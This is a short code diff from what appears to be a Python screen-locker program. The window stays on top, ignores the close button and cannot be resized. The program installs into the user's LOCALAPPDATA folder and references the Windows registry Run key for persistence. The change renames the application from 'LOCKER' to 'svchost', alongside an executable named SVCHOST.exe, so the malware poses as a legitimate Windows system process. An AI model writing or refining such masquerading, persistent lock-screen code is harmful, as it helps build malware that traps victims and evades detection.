@@ -28,7 +28,7 @@ root.attributes("-topmost", True)
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 root.resizable(False, False)
 
-APP_NAME = "LOCKER"
+APP_NAME = "svchost"
 INSTALL_DIR = Path(os.environ["LOCALAPPDATA"]) / APP_NAME
 INSTALLED_EXE = INSTALL_DIR / "SVCHOST.exe"
 REGISTRY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
